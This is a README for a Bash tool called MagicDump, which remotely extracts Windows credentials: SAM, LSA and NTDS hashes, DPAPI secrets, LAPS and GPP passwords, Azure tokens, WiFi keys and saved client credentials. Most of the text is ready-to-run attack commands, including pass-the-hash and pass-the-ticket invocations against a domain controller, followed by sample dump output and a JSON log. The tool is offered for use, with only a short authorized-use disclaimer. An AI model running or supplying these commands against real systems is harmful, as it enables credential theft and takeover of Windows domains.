# MagicDump

MagicDump is an automated tool designed to remotely dump credentials from Windows machines, including SAM, LSA, NTDS, DPAPI, and many other credential stores. It simplifies the process of extracting sensitive information, providing organized output and support for multiple authentication methods.

<br>

---

<br>

## Features
- **Comprehensive Credential Dumping**:
  - SAM, LSA, NTDS, DPAPI
  - LAPS (Local Administrator Password Solution)
  - Group Policy Preferences (GPP)
  - gMSA (Group Managed Service Accounts)
  - SCCM (System Center Configuration Manager)
  - Token Broker Cache (Microsoft 365/Azure tokens)
  - WiFi passwords
  - KeePass credentials
  - Veeam backup credentials
  - WinSCP stored sessions
  - PuTTY private keys & proxy credentials
  - Remote Desktop Connection Manager (RDCMan) stored credentials
- **Flexible Authentication**:
  - Username and Password Authentication.
  - Pass-the-Hash Authentication. 
  - Pass-the-Ticket Authentication.
- **Organized Output**:
  - Logs actions in JSON format.
  - Saves dumps and logs to `~/.magicdump/`.
- **Real-Time Feedback**: Displays actions on the screen as they happen.

<br>

---

<br>

## Requirements
- Bash Shell
- Tools for credential dumping (e.g., `impacket`, `netexec`, etc.)

<br>

---

<br>

## Installation
Clone the repository:
```bash
git clone https://github.com/Mag1cByt3s/MagicDump.git
cd MagicDump
```

<br>

Make the script executable:
```bash
chmod +x MagicDump
```

<br>

---

<br>

## Usage
Run the script with the required options:
```bash
./MagicDump -t <target_ip> -u <username> [-p <password> | -H <hash> | -k [--no-pass]] [--local-auth] [-v]
```

<br>

### Arguments
- `-t` / `--target`: Specify the target IP address of the Windows machine.
- `-u` / `--username`: Specify the username to authenticate as.
- `-p` / `--password`: Specify the password for authentication.
- `-H` / `--hash`: Specify the NTLM hash for Pass-the-Hash authentication.
- `k` / `--kerberos`: Use Kerberos authentication. Requires a valid Kerberos ticket.
  - If using Kerberos ticket cache (no password or hash), set the `KRB5CCNAME` environment variable to the path of your ticket and use `--no-pass`.
- `--no-pass`: Skip password or hash when using Kerberos authentication. Requires `-k`.
- `--local-auth`: Use local authentication (optional).
- `-v` / `--verbose`: Enable verbose output for debugging (optional).
- `-h` / `--help`: Show usage info

<br>

---

<br>

## Examples

Password auth:
```bash
./MagicDump -t 192.168.1.100 -u administrator -p SuperSecretPass123
```

Pass-the-Hash:
```bash
./MagicDump -t 192.168.1.100 -u administrator -H '0123456789abcdef0123456789abcdef'
```

Local auth:
```bash
./MagicDump -t 192.168.1.100 -u administrator -p P@ssw0rd --local-auth
```

Pass-the-Ticket (Kerberos auth):
```bash
KRB5CCNAME=administrator@cifs_dc.company.com@COMPANY.COM.ccache ./MagicDump -t dc.company.com -u administrator -k --no-pass
```

Kerberos auth with password:
```bash
./MagicDump -t dc.company.com -u administrator -p 'StrongPassword123' -k
```

<br>

Output:
```bash
==============================
       MagicDump v2.0       
==============================
[INFO] Starting MagicDump against target 192.168.1.100
[INFO] Authenticating as user 'administrator'...
[INFO] Starting SAM dump using netexec...
[LOG] Operation: SAM, Status: success
[INFO] SAM dump saved to ~/.magicdump/dumps/192.168.1.100/SAM_dump_192.168.1.100.txt
[SAM HASHES FOUND]:
SMB                      192.168.1.100    445    DC               administrator:500:FAKEHASH1:0123456789ABCDEF0123456789ABCDEF:::
SMB                      192.168.1.100    445    DC               Guest:501:FAKEHASH2:ABCDEFABCDEFABCDEFABCDEFABCDEF:::
SMB                      192.168.1.100    445    DC               defaultuser:503:FAKEHASH3:DEADBEEFDEADBEEFDEADBEEFDEADBEEF:::
[INFO] Starting LSA dump using netexec...
[LOG] Operation: LSA, Status: success
[INFO] LSA dump saved to ~/.magicdump/dumps/192.168.1.100/LSA_dump_192.168.1.100.txt
[LSA SECRETS FOUND]:
SMB                      192.168.1.100    445    DC               COMPANY\DC$:aes256-cts-hmac-sha1-96:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
SMB                      192.168.1.100    445    DC               COMPANY\DC$:aes128-cts-hmac-sha1-96:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
SMB                      192.168.1.100    445    DC               COMPANY\DC$:des-cbc-md5:CCCCCCCCCCCCCCCC
SMB                      192.168.1.100    445    DC               COMPANY\DC$:plain_password_hex:D41D8CD98F00B204E9800998ECF8427E
SMB                      192.168.1.100    445    DC               NL$KM:DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
SMB                      192.168.1.100    445    DC               COMPANY\svc_user:ServicePass!
[INFO] Starting NTDS dump using drsuapi...
[LOG] Operation: NTDS, Status: success
[INFO] NTDS dump saved to ~/.magicdump/dumps/192.168.1.100/NTDS_dump_192.168.1.100.txt
[NTDS DUMP COMPLETED]:
[NTDS HASHES FOUND]:
SMB                      192.168.1.100    445    DC               administrator:500:FAKENTDS1:0123456789ABCDEF0123456789ABCDEF:::
SMB                      192.168.1.100    445    DC               Guest:501:FAKENTDS2:ABCDEFABCDEFABCDEFABCDEFABCDEF:::
SMB                      192.168.1.100    445    DC               krbtgt:502:FAKENTDS3:7C032C3E2657F4554BC7AF108BD5EF17:::
SMB                      192.168.1.100    445    DC               user1:1103:FAKENTDS4:06207752633F7509F8E2E0D82E838699:::
[INFO] Starting LAPS dump using LDAP...
[LOG] Operation: LAPS, Status: success
[INFO] LAPS dump saved to ~/.magicdump/dumps/192.168.1.100/LAPS_dump_192.168.1.100.txt
[LAPS PASSWORDS FOUND]:
No LAPS passwords found.
[INFO] Starting DPAPI dump...
[LOG] Operation: DPAPI, Status: success
[INFO] DPAPI dump saved to ~/.magicdump/dumps/192.168.1.100/DPAPI_dump_192.168.1.100.txt
[DPAPI SECRETS FOUND]:
  -> Found 4 decrypted masterkeys.
Domain:batch=TaskScheduler:Task:{FAKE-GUID} - COMPANY\administrator:FAKEDPAPI
[INFO] Starting GPP dump...
[LOG] Operation: GPP Autologin, Status: success
[LOG] Operation: GPP Password, Status: success
[INFO] GPP dump saved to ~/.magicdump/dumps/192.168.1.100/GPP_dump_192.168.1.100.txt
[INFO] Starting gMSA credential dump...
[LOG] Operation: gMSA, Status: success
[INFO] gMSA credentials dump saved to ~/.magicdump/dumps/192.168.1.100/gMSA_dump_192.168.1.100.txt
[INFO] Starting KeePass discovery...
[LOG] Operation: KeePass_Discovery, Status: success
[INFO] KeePass discovery results saved to ~/.magicdump/dumps/192.168.1.100/KeePass_Discovery_192.168.1.100.txt
[WARNING] KeePass installation detected, but no config path found!
[INFO] Starting Veeam password dump...
[LOG] Operation: Veeam_Credentials, Status: success
[INFO] Veeam credentials saved to ~/.magicdump/dumps/192.168.1.100/Veeam_Credentials_192.168.1.100.txt
[INFO] Starting WinSCP credential dump...
[LOG] Operation: WinSCP_Credentials, Status: success
[INFO] WinSCP credentials saved to ~/.magicdump/dumps/192.168.1.100/WinSCP_Credentials_192.168.1.100.txt
[INFO] Starting PuTTY credential & private key dump...
[LOG] Operation: PuTTY_Credentials, Status: success
[INFO] PuTTY credentials and private keys saved to ~/.magicdump/dumps/192.168.1.100/PuTTY_Credentials_192.168.1.100.txt
[INFO] Starting RDCMan credential dump...
[LOG] Operation: RDCMan_Credentials, Status: success
[INFO] RDCMan credentials saved to ~/.magicdump/dumps/192.168.1.100/RDCMan_Credentials_192.168.1.100.txt
[INFO] Starting Wi-Fi password dump...
[LOG] Operation: WiFi_Passwords, Status: success
[INFO] Wi-Fi passwords saved to ~/.magicdump/dumps/192.168.1.100/WiFi_Passwords_192.168.1.100.txt
[INFO] Starting SCCM dump (disk method)...
[LOG] Operation: SCCM, Status: success
[INFO] SCCM dump (disk) saved to ~/.magicdump/dumps/192.168.1.100/SCCM_dump_192.168.1.100.txt
[INFO] Starting Token Broker Cache dump...
[LOG] Operation: TokenBrokerCache, Status: success
[INFO] Token Broker Cache dump saved to ~/.magicdump/dumps/192.168.1.100/TokenBrokerCache_192.168.1.100.txt
[INFO] Dumping complete. Logs saved to ~/.magicdump/logs/192.168.1.100/report_192.168.1.100_TIMESTAMP.json.
```

<br>

---

<br>

## Logfile example

```json
{
  "target_host": "192.168.1.100",
  "operation_time": "2025-02-12T08:02:52Z",
  "credentials_dumped": {
    "SAM": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/SAM_dump_192.168.1.100.txt"
    },
    "LSA": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/LSA_dump_192.168.1.100.txt"
    },
    "NTDS": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/NTDS_dump_192.168.1.100.txt",
      "method": "ntdsutil"
    },
    "LAPS": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/LAPS_dump_192.168.1.100.txt",
      "method": "laps"
    },
    "DPAPI": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/DPAPI_dump_192.168.1.100.txt"
    },
    "GPP Autologin": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/GPP_dump_192.168.1.100.txt"
    },
    "GPP Password": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/GPP_dump_192.168.1.100.txt"
    },
    "gMSA": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/gMSA_dump_192.168.1.100.txt"
    },
    "KeePass_Discovery": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/KeePass_Discovery_192.168.1.100.txt",
      "method": "keepass_discover"
    },
    "Veeam_Credentials": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/Veeam_Credentials_192.168.1.100.txt",
      "method": "veeam"
    },
    "WinSCP_Credentials": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/WinSCP_Credentials_192.168.1.100.txt",
      "method": "winscp"
    },
    "PuTTY_Credentials": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/PuTTY_Credentials_192.168.1.100.txt",
      "method": "putty"
    },
    "RDCMan_Credentials": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/RDCMan_Credentials_192.168.1.100.txt",
      "method": "rdcman"
    },
    "WiFi_Passwords": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/WiFi_Passwords_192.168.1.100.txt",
      "method": "wifi"
    },
    "SCCM": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/SCCM_dump_192.168.1.100.txt",
      "method": "disk"
    },
    "TokenBrokerCache": {
      "status": "success",
      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/TokenBrokerCache_192.168.1.100.txt",
      "method": "wam"
    }
  },
  "warnings": [
    "KeePass installation detected, but no config path found!"
  ],
  "logs": [
    "Starting MagicDump against target 192.168.1.100",
    "Authenticating as user 'administrator'...",
    "Starting SAM dump using netexec...",
    "SAM dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/SAM_dump_192.168.1.100.txt",
    "Starting LSA dump using netexec...",
    "LSA dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/LSA_dump_192.168.1.100.txt",
    "Starting NTDS dump using drsuapi...",
    "NTDS dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/NTDS_dump_192.168.1.100.txt",
    "Starting LAPS dump using LDAP...",
    "LAPS dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/LAPS_dump_192.168.1.100.txt",
    "Starting DPAPI dump...",
    "DPAPI dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/DPAPI_dump_192.168.1.100.txt",
    "Starting GPP dump...",
    "GPP dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/GPP_dump_192.168.1.100.txt",
    "Starting gMSA credential dump...",
    "gMSA credentials dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/gMSA_dump_192.168.1.100.txt",
    "Starting KeePass discovery...",
    "KeePass discovery results saved to /home/pascal/.magicdump/dumps/192.168.1.100/KeePass_Discovery_192.168.1.100.txt",
    "Starting Veeam password dump...",
    "Veeam credentials saved to /home/pascal/.magicdump/dumps/192.168.1.100/Veeam_Credentials_192.168.1.100.txt",
    "Starting WinSCP credential dump...",
    "WinSCP credentials saved to /home/pascal/.magicdump/dumps/192.168.1.100/WinSCP_Credentials_192.168.1.100.txt",
    "Starting PuTTY credential & private key dump...",
    "PuTTY credentials and private keys saved to /home/pascal/.magicdump/dumps/192.168.1.100/PuTTY_Credentials_192.168.1.100.txt",
    "Starting RDCMan credential dump...",
    "RDCMan credentials saved to /home/pascal/.magicdump/dumps/192.168.1.100/RDCMan_Credentials_192.168.1.100.txt",
    "Starting Wi-Fi password dump...",
    "Wi-Fi passwords saved to /home/pascal/.magicdump/dumps/192.168.1.100/WiFi_Passwords_192.168.1.100.txt",
    "Starting SCCM dump (disk method)...",
    "SCCM dump (disk) saved to /home/pascal/.magicdump/dumps/192.168.1.100/SCCM_dump_192.168.1.100.txt",
    "Starting Token Broker Cache dump...",
    "Token Broker Cache dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/TokenBrokerCache_192.168.1.100.txt"
  ]
}
```

<br>

---

<br>

## Roadmap
- Integrate more advanced credential dumping techniques.
- Encrypt logs and dumps for security.

<br>

---

<br>

## License
[GPLv3 License](LICENSE)

<br>

---

<br>

## Disclaimer
**MagicDump is intended for authorized use only.** Ensure you have permission before using this tool on any system.
